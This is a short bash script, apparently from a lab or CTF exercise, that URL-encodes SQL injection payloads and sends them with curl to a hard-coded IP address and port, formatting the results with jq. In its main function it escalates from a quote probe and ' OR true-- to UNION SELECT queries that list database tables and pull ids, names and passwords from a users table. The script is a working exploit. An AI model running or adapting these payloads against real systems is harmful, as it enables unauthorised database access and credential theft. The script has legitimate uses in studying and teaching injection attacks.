#!/usr/bin/env bash
# -----------------------------------
#| bgll.fullstackfullstock.com       |
#| github.com/babidiii               |
# -----------------------------------

#[[-------------------------------------------------------------------- Settings
set -o errexit   # abort on nonzero exitstatus
set -o nounset   # abort on unbound variable
set -o pipefail  # don't hide errors within pipes
# set -o xtrace  # for debug : could use bash -x prog instead 
#]]


#[[-------------------------------------------------------------------- Utils

# function taken from this github gist discussion about urlencoding and decoding in bash
# https://gist.github.com/cdown/1163649
urle () { [[ "${1}" ]] || return 1; local LANG=C i x; for (( i = 0; i < ${#1}; i++ )); do x="${1:i:1}"; [[ "${x}" == [a-zA-Z0-9.~_-] ]] && echo -n "${x}" || printf '%%%02X' "'${x}"; done; echo; }
urld () { [[ "${1}" ]] || return 1; : "${1//+/ }"; echo -e "${_//%/\\x}"; }

log(){
  printf "* [PAYLOAD] -> %s\n" "${1}"
  printf "* [ENCODED] -> %s\n" "${2}"
  printf "* [FILTER]  -> %s\n" "${3:-none}"
}

send_malicious_payload(){
  enc_pld=$(urle "${1}")
  log "${1}" "${enc_pld}" ${@:2}

  curl -s -S "${base_url}${enc_pld}" | jq ${@:2}
}
#]]

#[[-------------------------------------------------------------------- Main
main() {
  base_url="165.227.225.62:3333/team/"
  send_malicious_payload "Dion" 
  send_malicious_payload "Dion'--" 
  send_malicious_payload "' OR true--" '.[:3]'
  send_malicious_payload "' UNION SELECT null,table_name,null,null,null FROM information_schema.tables--." '.[:5]'
  send_malicious_payload "' UNION SELECT id,firstname,password,null from users --"
}
#]]

main "${@}"

